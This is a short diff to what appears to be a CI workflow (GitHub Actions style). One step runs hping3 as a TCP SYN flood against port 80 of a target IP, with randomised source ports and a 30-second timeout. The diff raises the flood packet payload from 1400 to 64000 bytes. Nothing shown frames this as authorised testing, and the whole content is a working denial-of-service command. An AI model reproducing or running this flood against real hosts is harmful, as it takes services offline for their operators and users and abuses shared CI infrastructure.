@@ -90,4 +90,4 @@ jobs:
           echo $IP
           # sleep 10
           echo "当前时间：$(date "+%Y-%m-%d %H:%M:%S")"
-          sudo timeout 30s hping3 -S --flood -V -d 1400 -p 80 -s 1000-65535 $IP
+          sudo timeout 30s hping3 -S --flood -V -d 64000 -p 80 -s 1000-65535 $IP
